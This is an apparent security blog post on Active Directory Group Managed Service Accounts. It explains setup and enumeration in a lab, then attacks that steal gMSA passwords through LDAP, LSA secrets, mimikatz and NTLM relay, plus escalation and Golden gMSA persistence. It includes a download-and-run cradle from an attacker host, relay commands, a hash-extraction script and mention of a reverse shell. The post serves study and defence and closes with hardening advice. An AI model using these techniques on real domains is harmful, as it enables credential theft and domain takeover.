---
title: "Exploring Group Managed Service Accounts (gMSA)"
date: 2023-09-29T01:00:01+02:00
tags:
  - active-directory
  - windows
toc: true
showdate: true
---

Another day, another Active Directory feature to put under the microscope. This time it's Group Managed Service Accounts, which I briefly mentioned in my post about [confidential attributes](/post/confidential-attributes/). I'll exaplain what gMSAs are, how to configure them in a test lab, and what kinds of attacks are possible on these accounts.

---

## Theory

Group Managed Service Accounts (gMSA) have been introduced with Windows Server 2012 to make service accounts safer: user accounts used not by humans but for running services often require elevated or specific privileges and their passwords are rarely changed, with these accounts often being excluded from having to follow the password policy.

Not only gMSA is a useful feature for running multiple service instances on different hosts with the same domain account, but it is also a solution to the password management problem because as the name suggests gMSA are managed automatically by AD: administrators don't have to concern themselves with password resets as every service account will be given a very complex unique password every 30 days.

These passwords are generated from a set of variables contained in an AD object called the Key Distribution Service (KDS) root key, these variables are stored as attributes in the object and are prefixed with `msKds`:

![94130e83ab903e9d10db9fe3b9e54192.png](/_resources/94130e83ab903e9d10db9fe3b9e54192.png)

These are all confidential attributes accessible only by domain and enterprise administrators and are used to create a Group Key Envelope ([GKE](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gkdi/192c061c-e740-4aa0-ab1d-6954fb3e58f7)) structure to generate the password with a call to the [Get-Key](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gkdi/4cac87a3-521e-4918-a272-240f8fabed39) RPC method of the [MS-GKDI](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gkdi/943dd4f6-6b80-4a66-8594-80df6d2aad0a) protocol, utilized to enable clients to obtain cryptographic keys associated with AD security principals.

Passwords of managed accounts are stored by a DC in special [constructed attributes](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a3aff238-5f0e-4eec-8598-0a59c30ecd56) of the managed account's AD object. A constructed attribute is an attribute whose value is not stored directly in the AD database, rather its value has to be computed by a client authorized to access it using data taken from other attributes.

The creation of a managed service account will add an object of class `msDS-GroupManagedServiceAccount` to the domain, some of the most important attributes of this class are the following:
- `msDS-GroupMSAMembership`: a security descriptor declaring which groups are allowed to obtain the account's clear-text password
- `msDS-ManagedPassword`: constructed attribute containing a Binary Large OBject (BLOB) with the current and previous gMSA password in clear-text
- `msDS-ManagedPasswordID`: constructed attribute containing a key ID used to generate the current password
- `ms-DS-ManagedPasswordPreviousId`: like above but to generate the previous gMSA password
- `ms-DS-ManagedPasswordInterval`: number in days after which the account's password is rotated, 30 by default

`msDS-GroupMSAMembership` contains a security descriptor in string form, this syntax is called  `String(NT-Sec-Desc)` and is a base64 encoded binary security descriptor. While the attribute can't be interpreted directly, AD exposes a property called `PrincipalsAllowedToRetrieveManagedPassword` which interprets and updates `msDS-GroupMSAMembership` for us:

![fd71bdec6ad516ffeaf5a57d2b894794.png](/_resources/fd71bdec6ad516ffeaf5a57d2b894794.png)



---

## Lab Setup

First we are going to create a new KDS root key in the domain, as said above this is an object that will contain all of the required parameters for the DCs to generate gMSA passwords. `Add-KdsRootKey` is the cmdlet for the job, the only required parameter is a date after which the key is in effect, setting a time from the past will enable it right away:

![9f77b7aff3bc893e6f33aabbcc6932a5.png](/_resources/9f77b7aff3bc893e6f33aabbcc6932a5.png)

The new key can be viewed from ADSS or ADSI Edit (in the Configuration NC), the attributes starting with `msKds` are those used for the generation of the Group Key Envelope ([GKE](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gkdi/192c061c-e740-4aa0-ab1d-6954fb3e58f7)), which is in turn used to generate gMSA passwords:

![bccefe992c579c501f95b94d54519353.png](/_resources/bccefe992c579c501f95b94d54519353.png)

Next a new security group is created, it will be used to grant a series of principals permissions to request the gMSA passwords:

![4aab51ac372918bbaa69d78071c3c8ca.png](/_resources/4aab51ac372918bbaa69d78071c3c8ca.png)

Then populate the group with all the users and computers you wish to access the managed account passwords, the computers using gMSA must be in this group or you won't be able to install the managed users on them:

![dc3c97cdb9ff3de944106936ba6fe9e4.png](/_resources/dc3c97cdb9ff3de944106936ba6fe9e4.png)

Now the `New-ADServiceAccount` cmdlet can be used to create the account, here I specified the account's name, the DNS host name, and the security group I just created for password retrieval:

![00a5605fb1d48694989b6966ea412124.png](/_resources/00a5605fb1d48694989b6966ea412124.png)

From the distinguished name we can tell this account is not stored with other AD users, gMSAs have a dedicated container: "Managed Service Accounts". Also notice how `SamAccountName` ends with a dollar sign like with machine accounts, you'll need this when specifying gMSA account names from Linux.

The service account now needs to be installed on the computers hosting the desired services, `Install-ADServiceAccount` requires the ActiveDirectory PowerShell module so install it if you don't already have it on these computers:
```powershell
Install-WindowsFeature RSAT-AD-PowerShell
Install-ADServiceAccount GMSA_USR1
```

If you get an "unspecified error has occurred" message make sure you have added the machine account of the computer to your gMSA group, if you made this change with that computer running you may need to reboot it to update the security descriptor with the new group membership.

Finally, make sure to run `Test-ADServiceAccount` to verify the account was installed properly:

![3c476290f72b162a7258f38f9d9fda5f.png](/_resources/3c476290f72b162a7258f38f9d9fda5f.png)

You might want to also give the account an SPN to let it authenticate using Kerberos, this is done with `setspn.exe`:
```text
setspn -a <SPN> <USER>
```

![ce027f44722c29e12175d00b07aa011f.png](/_resources/ce027f44722c29e12175d00b07aa011f.png)

Now the `ServicePrincipalName` attribute has been populated:

![921a868ca5a2acb9e01570403c67062c.png](/_resources/921a868ca5a2acb9e01570403c67062c.png)

I want to use the account to run IIS so from the IIS Manager I go to the advanced settings of the application pool and change the Identity property:

![217793dc8a0f106b24668d5bf58446db.png](/_resources/217793dc8a0f106b24668d5bf58446db.png)

The service account is fully set up and in use.

---

## Enumeration

If we already happen to have landed on a machine with the AD PowerShell module installed (or if we feel like loading it [ourselves]()), we can just use the `Get-ADServiceAccount` cmdlet to list all of the managed accounts:
```powershell
Get-ADServiceAccount -Filter * -Properties * | Select SamAccountName,PrincipalsAllowedToRetrieveManagedPassword,msDS-ManagedPasswordInterval,ServicePrincipalNames
```

![dd1a0e77903cb71e4fe79773c7bc2718.png](/_resources/dd1a0e77903cb71e4fe79773c7bc2718.png)

With these attributes we can gather this information:
- we have one gMSA called GMSA_USR1$
- a group called GMSA_Users can request its password
- the service account is installed and in use on SQL1 for IIS (http SPN)
- the password is rotated every 30 days

If that's not the case we can find them manually with some LDAP magic, all we need to do is filter by `objectClass`:
```text
(objectClass=msDS-GroupManagedServiceAccount)
```

The attributes we are interested in reading are the same as above, but unfortunately not using PowerShell we cannot access the `PrincipalsAllowedToRetrieveManagedPassword` property, so from this query alone we cannot determine what users have access to the password:
```text
python3 windapsearch.py --dc-ip 192.168.0.100 -u 'pirelli@its-piemonte.local' -p 'Peepee!1' \
> --custom '(objectClass=msDS-GroupManagedServiceAccount)' --attrs SamAccountName,ServicePrincipalName
```

![8d7e99b8cef81c1427163678140b63a4.png](/_resources/8d7e99b8cef81c1427163678140b63a4.png)

However BloodHound can answer that question with a simple Cypher query:
```text
MATCH p=()-[:ReadGMSAPassword]->() RETURN p
```

![6a19a6ccae9965e01f03d9008733c376.png](/_resources/6a19a6ccae9965e01f03d9008733c376.png)

If the `ServicePrincipalName` attribute of a gMSA is populated we can tell where those accounts are installed, so we can decide to target the computers found in the SPNs to compromise them and obtain the managed account's password. If the managed account is privileged, which is often the case, we can compromise the entire domain. Another way of picking our next target is applying [admin hunting techniques](), but looking for gMSA sessions instead.

---

## gMSA Password Retrieval #1: RPC/LDAP

After obtaining the list of users capable of reading gMSA passwords we are going to want to compromise one of them. If we were able to compromise a system running a gMSA we can use psexec to start a session as `NT Authority\SYSTEM` (`-s` flag in the original psexec), which gives us the security descriptor of the host's machine account.

If psexec's remote service creation shenanigans get blocked we can try other methods like extracting the machine account's NT hash from the LSA secrets and login with smbexec, atexec, wmiexec, WinRM, etc... while the ideal scenario would be compromising a normal user account in some domains the gMSA management group may be populated only by machine accounts.

Either way we should now be able to access the password blob:

![c3d0aea3bab7ea99715a5f21fe975b40.png](/_resources/c3d0aea3bab7ea99715a5f21fe975b40.png)

The [DSInternals](https://github.com/MichaelGrafnetter/DSInternals) PowerShell module can interpret it with `ConvertFrom-ADManagedPasswordBlob`, however the clear-text password will be filled with unicode characters not easily displayed in most consoles, so it's much easier to output its NT hash with DSInternals' `ConvertTo-NTHash`:
```powershell
$gmsa = Get-ADServiceAccount GMSA_USR1 -Properties msDS-ManagedPassword
$pass = ConvertFrom-ADManagedPasswordBlob -Blob $gmsa.'msDS-ManagedPassword'
$secpass = ConvertTo-SecureString -String $pass.'CurrentPassword' -AsPlainText -Force
ConvertTo-NTHash -Password $secpass
```

![a08364a15c1c31389079c16ce4d06dec.png](/_resources/a08364a15c1c31389079c16ce4d06dec.png)

Still, I don't like this method because we are relying on two PowerShell modules that don't come built in a default Windows installation, and installing them on someone else's environment may not be desirable.

There are a few alternatives, if we prefer Linux we can use [gMSADumper](https://github.com/micahvandeusen/gMSADumper) but there is one limitation: Windows will refuse to send password data through LDAP unless we are using LDAPS, which is disabled by default because a TLS certificate is required. Without LDAPS only the gMSA ACLs will be shown:

![0f07fd2d42f4e40585af442a921fc6f3.png](/_resources/0f07fd2d42f4e40585af442a921fc6f3.png)

If LDAPS is supported the script will calculate NT hashes and cryptographic keys for us:

![eb91f29755d188616331a54e45f5944c.png](/_resources/eb91f29755d188616331a54e45f5944c.png)

Of course these can be used to pass the hash like usual:

![44825aee273958668ecf70d85c66634c.png](/_resources/44825aee273958668ecf70d85c66634c.png)

Yet another option if we want to run code from a domain joined machine without installing PowerShell modules is [GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader), a C# program also available wrapped in a [PowerShell script](https://github.com/ricardojba/Invoke-GMSAPasswordReader) we can load in memory with a cradle:
```powershell
IEX(IWR 'http://192.168.0.222/Invoke-GMSAPasswordReader.ps1'
Invoke-GMSAPasswordReader -Command "--AccountName GMSA_ADCS"
```

![cd9535cd2fed7688bfc3d37e0c827e95.png](/_resources/cd9535cd2fed7688bfc3d37e0c827e95.png)

---

## gMSA Password Retrieval #2: LSA Secrets

If we have access as SYSTEM on the hosts where a gMSA is installed we can extract the clear text password from the LSA secrets, instead of requesting it from the DC. Windows stores the password here in case it needs to start the associated service while the DC cannot be contacted.

[Nestori Syynimaa](https://aadinternals.com/post/gmsa/) discovered that gMSA passwords are stored in `HKLM\SECURITY\Policy\Secrets` inside keys prefixed with `_SC_GMSA_{84A78B8C-56EE-465b-8496-FFB35A1B52A7}_` and followed by a HMAC SHA256 hash calculated from the uppercase domain and account name of the account:

![688d1d46656ab674a1014e653586e2a2.png](/_resources/688d1d46656ab674a1014e653586e2a2.png)

His [AADInternals](https://github.com/Gerenios/AADInternals) module can not only obtain the passwords from LSA but also print the account they belong to, useful if there is more than one in the same host because the LSA secrets don't seem to store the gMSA name but only the password:
```powershell
Get-AADIntLSASecrets -AccountName "its-piemonte\GMSA_USR1"
```

![ffaf1daa68fdaaeb195ed6154b2d3318.png](/_resources/ffaf1daa68fdaaeb195ed6154b2d3318.png)

We have both the clear-text password (as long as our console can read UTF-16) and the NT hash in the `MD4Txt` field.

If we don't want to install AADInternals on the host we can use other LSA secrets dumping options like impacket's secretsdump and mimikatz, but we won't be able to see the account they belong to and we have to make do with the hex representation:

![d9f318191f2159e68ef476a9ec3bae72.png](/_resources/d9f318191f2159e68ef476a9ec3bae72.png)

We can however still use DSInternals to convert the blob to an NT hash, with a little string manipulation. First separate every hexadecimal byte with a comma and convert every byte to decimal notation, then run this command and we'll have our NT hash:
```powershell
(ConvertFrom-ADManagedPasswordBlob <BLOB>).SecureCurrentPassword | ConvertTo-NTHash
```

![28e2f9f78ecba43cc2cc0ffdb4ec15a8.png](/_resources/28e2f9f78ecba43cc2cc0ffdb4ec15a8.png)

Or, if we want to stick to Linux, run this Python script with your decimal blob to get the same result, it's just a slightly edited version of [Alberto Solino](https://github.com/fortra/impacket/pull/770)'s PoC':
```python
from impacket.structure import Structure

class MSDS_MANAGEDPASSWORD_BLOB(Structure):
    structure = (
        ('Version','<H'),
        ('Reserved','<H'),
        ('Length','<L'),
        ('CurrentPasswordOffset','<H'),
        ('PreviousPasswordOffset','<H'),
        ('QueryPasswordIntervalOffset','<H'),
        ('UnchangedPasswordIntervalOffset','<H'),
        ('CurrentPassword',':'),
        ('PreviousPassword',':'),
        ('QueryPasswordInterval',':'),
        ('UnchangedPasswordInterval',':'),
    )

    def __init__(self, data = None):
        Structure.__init__(self, data = data)

    def fromString(self, data):
        Structure.fromString(self,data)

        if self['PreviousPasswordOffset'] == 0:
            endData = self['QueryPasswordIntervalOffset']
        else:
            endData = self['PreviousPasswordOffset']

        self['CurrentPassword'] = self.rawData[self['CurrentPasswordOffset']:][:endData - self['CurrentPasswordOffset']]
        if self['PreviousPasswordOffset'] != 0:
            self['PreviousPassword'] = self.rawData[self['PreviousPasswordOffset']:][:self['QueryPasswordIntervalOffset']-self['PreviousPasswordOffset']]

        self['QueryPasswordInterval'] = self.rawData[self['QueryPasswordIntervalOffset']:][:self['UnchangedPasswordIntervalOffset']-self['QueryPasswordIntervalOffset']]
        self['UnchangedPasswordInterval'] = self.rawData[self['UnchangedPasswordIntervalOffset']:]

relayxOutput = (<BLOB>)

blob = MSDS_MANAGEDPASSWORD_BLOB()
blob.fromString(bytes(relayxOutput))
from Cryptodome.Hash import MD4
hash = MD4.new ()
hash.update (blob['CurrentPassword'][:-2])
print("="*80)
print(hash.hexdigest())
print("="*80)

```

![d5240aa4e9c8ba921b0bd76e437d982f.png](/_resources/d5240aa4e9c8ba921b0bd76e437d982f.png)

Combining secretsdump and this script allows us to retrieve usable gMSA credentials remotely without needing LDAPS enabled and without installing PowerShell modules, so it is my personal favorite option.

---

## gMSA Password Retrieval #3: Mimikatz

If we are local administrators on a host that's running a gMSA-powered service we can also resort to mimikatz, see it as a slight variation to the previous method. Instead of reading the clear-text password from the LSA secrets mimikatz will read the NT hash stored in the memory of lsass.exe. This method only works if the service is already running, but if it isn't we can just start it ourselves since we are admins.

There is a little trick though, usually to do this we would run `sekurlsa::logonpasswords` but the NT hash returned is incorrect:

![b97ca4817779bce4b74732bdc8b1eb1d.png](/_resources/b97ca4817779bce4b74732bdc8b1eb1d.png)

We can see it's different from the NT hash we get from dumping the AD database:

![0eae6ee2283ddc5984826d1f9390b2ae.png](/_resources/0eae6ee2283ddc5984826d1f9390b2ae.png)

The real hash can be found with `sekurlsa::ekeys`:

![13fc2a8c57cef3af7941eddbb87874f1.png](/_resources/13fc2a8c57cef3af7941eddbb87874f1.png)

---

## gMSA Password Retrieval #4: NTLM Relay

Another alternative method of obtaining gMSA credentials is relaying one of the users who can request the passwords to LDAP, querying the `msDS-ManagedPassword` attribute for us. There is one limitation though: we can't relay SMB because connecting to LDAP from SMB would require signing to be enabled, which we couldn't relay. Instead we need to relay HTTP requests to LDAP.

Because this post isn't focused on NTLM relays I'll only show one scenario as example and it is through good old LLMNR poisoning because it's the easiest one to replicate: Responder is set up to answer to LLMNR and NBT-NS queries giving victims our IP address, this way they will initiate a connection to our host and if a user with password retrieval permissions gives us their credentials through HTTP we can relay them over to LDAPS and thus read the gMSA password. Yes this is not a super likely scenario but just see it as a PoC:
```text
# responder -I eth0
# impacket-ntlmrelayx --no-dump --no-da --no-acl --no-validate-privs --dump-gmsa -t ldaps://192.168.0.100
```

After launching responder and ntlmrelayx with the `--dump-gmsa` option we can only wait and hope for the right target to fall into our trap (there are authentication coercion tricks we could use but those warrant their own blog, coming soon (hopefully)). Eventually responder picks something up and poisons a resolution attempt for a bad hostname:

![ea1e8ccdf39ed26f2fa27645c4ac89a9.png](/_resources/ea1e8ccdf39ed26f2fa27645c4ac89a9.png)

This causes our victim to see an authentication dialog when visiting their desired page:

![39aa28abfde59eb0dea641eeba1619d2.png](/_resources/39aa28abfde59eb0dea641eeba1619d2.png)

If they do type their credentials we have won:

![5657e55af3589668fc76b63ec81cc24c.png](/_resources/5657e55af3589668fc76b63ec81cc24c.png)

Note that as already mentioned this relay won't work if the authentication request comes from SMB, but only if we are relaying HTTP. Otherwise we will see this error on ntlmrelayx:

![214f3d859d58471157946706814155af.png](/_resources/214f3d859d58471157946706814155af.png)

---

## Local Admin To gMSA Escalation

Yet another discovery by [Nestory Syynimaa](https://aadinternals.com/post/local_admin_to_gmsa/), this method allows a local administrator to execute arbitrary code in the context of a gMSA installed on the local computer, without needing to know its password.

It's a very simple tactic: manipulate the `ObjectName` key of a service's registry entry to change the service user into the gMSA, then point the `ImagePath` key to the code we want to execute.

Service data is found at this registry location:
```text
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\<service name>
```

![f210608eb6c0281005ce2430c5adbd87.png](/_resources/f210608eb6c0281005ce2430c5adbd87.png)

In his blog Nestory Syynimaa includes a very useful automated PowerShell PoC that compiles and saves a simple C# service to disk that allows us to execute arbitrary PowerShell scripts, it registers it to the SCM and sets the account as our gMSA of choice. After execution, the service is automatically stopped and deleted from the registry, you can find the full code in [his article](https://aadinternals.com/post/local_admin_to_gmsa/).

`run_poc.ps1` is the code responsible for the service creation/execution/deletion, while `service.ps1` contains the payload. In my example I'm going to place [this](https://github.com/martinsohn/PowerShell-reverse-shell/blob/main/powershell-reverse-shell.ps1) PowerShell reverse shell in my `service.ps1`:

![b66d3a3a1083d2c71ee525336dd16ab7.png](/_resources/b66d3a3a1083d2c71ee525336dd16ab7.png)

The warnings are normal, the SCM is expecting the service to return an ok but the script isn't a normal service so the SCM keeps waiting for eternity, however on the attacker's machine the connection has arrived and we have taken control of the gMSA:

![e8555c0305b968db5a1b3174a10a74fa.png](/_resources/e8555c0305b968db5a1b3174a10a74fa.png)

---

## Domain Persistence: Golden gMSA

First introduced by [Yuval Gordon](https://www.semperis.com/blog/golden-gmsa-attack/) of Semperis, the golden gMSA attack allows us to calculate a gMSA's previous, current, and future passwords without touching the DC. This is achieved by reading the confidential attributes stored in the KDS root key that we saw towards the beginning of the post.

These attributes are never updated automatically so if we manage to become domain administrators and read these attributes we will be able to grant ourselves a backdoor in the domain, because even if the password of the gMSA will change every N. days (30 by default) we can just calculate the current one at any given time.

The [GoldenGMSA](https://github.com/Semperis/GoldenGMSA) tool is used to gather the confidential attributes and then generate the passwords, but unfortunately at the moment I cannot post my own lab material because I have been fighting with the repository's dependencies to no avail, so I can only redirect you to the [original blog](https://www.semperis.com/blog/golden-gmsa-attack/) if you want to see this tool in action. I'll try to solve this issue when I have some more time and I'll update this paragraph as soon as I have done so. Sorry!

However if you do get it to work there is an interesting feature to note, documented in [this article](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent) by Improsec's Jonas Bülow Knudsen, Martin Sohn Christensen, and Tobias Thorbjørn Munch Torp: KDS root keys are stored in the Configuration NC, which gets replicated from the root of a forest to every child doman, which means if the root domain has a KDS key this will also be copied in the Configuration NC of every child domain, obviously that copy will be readable by the domain admins of that domain.

What this does is make it possible for a domain admin of child domain B to calculate the gMSA passwords of root domain A, thus leading to intra-forest privilege escalation.

---

## Securing Your Environment

gMSA attacks come mostly from misconfigurations, it is important that you are very careful in giving permissions to retrieve managed passwords only to the essential users and/or computers (machine accounts only should be preferrable), those accounts also need to be protected themselves and so should the hosts making use of the managed accounts. The failure of any one of these elements can cause the direct compromise of the entire chain: users, computers, managed passwords, potentially the whole domain and forest.

Make sure you are monitoring Windows event logs to spot golden gMSA attacks so you can intervene immediately and create a new root KDS key and new gMSA accounts with that key, it's the only way to stop this attack even if you kick out the attackers, as they only need to read the KDS attributes once to guess every managed password for as long as they like.

---

**References**
- https://adsecurity.org/?p=4367
- https://aadinternals.com/post/gmsa/
- https://aadinternals.com/post/local_admin_to_gmsa/
- https://www.dsinternals.com/en/retrieving-cleartext-gmsa-passwords-from-active-directory/
- https://cube0x0.github.io/Relaying-for-gMSA/
- https://www.semperis.com/blog/golden-gmsa-attack/
- https://github.com/Semperis/GoldenGMSA
- https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent
- https://github.com/micahvandeusen/gMSADumper
- https://github.com/markgamache/gMSA
- https://github.com/rvazarkar/GMSAPasswordReader